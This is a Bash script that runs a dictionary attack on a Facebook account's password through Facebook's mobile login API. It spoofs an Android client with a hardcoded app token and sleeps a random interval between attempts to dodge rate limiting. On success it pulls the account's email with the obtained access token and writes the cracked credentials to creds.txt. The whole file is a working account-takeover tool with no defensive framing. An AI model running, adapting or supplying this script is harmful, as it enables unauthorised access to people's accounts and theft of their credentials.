#!/bin/bash

usage() {

    echo -en "\nUsage: $(basename "$0") -u <user ID> -d <dictionary txt file>"
    exit 1

}

fb_login_attempt() { 

    local USER_AGENT='Dalvik/2.1.0 (Linux; U; Android 12; SM-S920L Build/QP1A.918122.126)'
    local URL="https://b-graph.facebook.com/auth/login"
    local OAuth="350685531728|62f8ce9f74b12f84c123cc23437a4a32" 
    local ID=$1
    local PSW=$2

    curl --user-agent "${USER_AGENT}" -X POST --url ${URL} \
    -H "Host: graph.facebook.com" -H "Accept-Encoding: gzip, deflate" -H "Accept: */*" \
    -H "Connection: keep-alive" -H "Authorization: OAuth ${OAuth}" \
    -H "X-FB-Friendly-Name: authenticate" -H "X-FB-Connection-Bandwidth: 24952" \
    -H "X-FB-Net-HNI: 28387" -H "X-FB-SIM-HNI: 20779" -H "X-FB-Connection-Type: unknown" \
    -H "X-FB-HTTP-Engine: Liger" -H "Content-Type: application/json" --silent --compressed -L \
    -d '{
    
        "format": "json",
        "email": "'"${ID}"'",
        "password": "'"${PSW}"'",
        "locale": "en_US",
        "client_country_code": "US",
        "method": "auth.login", 
        "generate_session_cookies": "1"

    }'

}

email_lf() {

    local ID=$1
    local token=$2
    curl -X GET --silent --url "https://graph.facebook.com/${ID}?fields=email&access_token=${token}" | jq -r ".email" 

} 

email=""
passwords_to_test=""

while getopts ":u:d:" opt; do
    case ${opt} in
        u)
            email="$OPTARG"
            ;;

        d)
            passwords_to_test="$OPTARG"
            ;;
       
        \?)
            echo "unrecognized switch: -$OPTARG" 1>&2
            usage
            ;;
        :)
            echo "The switch -$OPTARG needs an argument." 1>&2
            usage
            ;;
    esac
done
shift $((OPTIND -1))

if [[ -z "${email}" || -z "${passwords_to_test}" ]]; then

    usage

elif [[ ! -x "$(command -v curl)" ]];then 

    echo -en "\ncurl isn't installed [x]"
    exit

elif [[ ! -x "$(command -v jq)" ]];then 

    echo -en "\njq isn't installed [x]"
    exit

elif [[ -z $(file -bi ${passwords_to_test} | grep text ) || ! -s ${passwords_to_test} ]];then

    echo -en "\nthe dictionary file ${passwords_to_test} isn't usable [x]"
    exit

else

    echo -en "\nTrying to looking for the password of the account ${email}...\n\n"
    while read LINE 
    do  

        attempt=$(fb_login_attempt ${email} ${LINE[@]} | jq )
        got_key=$(echo ${attempt} | jq -r '.session_key') 
        if [[ ${got_key} = null ]]; then
    
            echo "${LINE[@]} isn't the password."
            sleep $(shuf -i 2-4 -n 1)
    
        else

            echo "${LINE[@]} is the password."
            break
    
        fi

    done < ${passwords_to_test}  

    got_at=$(echo ${attempt} | jq -r '.access_token') 

    if [[ ${got_at} = null ]];then

        echo -en "\nYou're out of luck [x]\n"
        exit

    else

        credentials_file=creds.txt

        echo -en "\nWe are looking the email address of the account ${email} [!]\n"
        email_account=$(email_lf ${email} ${got_at})

        if [[ ${email_account} = null ]];then

            echo -en "The email address of the account ${email} has been not found... [?]\n"
            
        else

            echo -en "The email address of the account ${email} is ${email_account} [!]\n"
            
        fi 

        [[ ${email_account} = null ]] && credz="[${email}]:${LINE}" || credz="[${email}] ${email_account}:${LINE}"

        if [[ ! -f ${credentials_file} ]];then 

            echo "${credz}" | dd of=${credentials_file} >/dev/null 2>&1

        else

            echo "${credz}" > ${credentials_file}

        fi

        echo -en "The credentials have been saved in the file ${credentials_file}\n"

    fi

fi
